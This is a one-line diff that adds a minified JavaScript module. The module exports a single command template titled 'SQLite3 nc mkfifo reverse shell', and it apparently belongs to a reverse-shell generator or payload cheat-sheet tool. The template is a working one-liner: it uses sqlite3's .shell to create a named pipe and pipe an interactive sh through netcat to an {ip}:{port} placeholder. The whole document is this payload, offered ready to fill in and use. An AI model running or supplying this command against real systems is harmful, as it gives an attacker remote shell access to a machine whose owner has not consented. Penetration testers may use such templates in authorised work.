@@ -1,0 +1,1 @@
+const e=[{title:"SQLite3 nc mkfifo reverse shell",template:"sqlite3 /dev/null '.shell rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {ip} {port} >/tmp/f'",description:"Reverse shell via SQLite3 using named pipe and netcat."}],t={commands:e};export{e as commands,t as default};
